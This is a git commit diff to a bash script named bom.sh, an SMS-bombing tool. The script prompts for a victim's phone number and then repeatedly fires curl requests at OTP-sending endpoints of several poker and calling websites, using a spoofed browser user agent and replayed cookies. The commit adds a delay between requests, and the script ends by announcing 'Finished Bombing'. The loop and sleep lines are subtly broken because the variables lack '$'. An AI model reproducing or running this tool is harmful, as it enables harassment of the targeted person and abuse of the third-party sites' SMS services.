79cf51beeb1a9427d1559f6303bbce51a9f0d4ee
apt-x4869 <55894766+apt-x4869@users.noreply.github.com>
2019-10-31 22:14:53 +0530

    Update bom.sh

--- bom.sh
+++ bom.sh
@@ -15,13 +15,21 @@ read phonen
 echo Enter no of sms...
 read nos
 banner "Good to go..."
+echo Delay between SMS...
+read del
 for x in {1..nos}
 do
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokersaint.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
+sleep del
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
+sleep del
 curl http://ftrpoker.com/smsc?PHONE=$phonen
+sleep del
 curl http://thespartanpoker.com/smsc?PHONE=$phonen
+sleep del
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen"
+sleep del
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen"
+sleep del
 done
 banner "Finished Bombing"
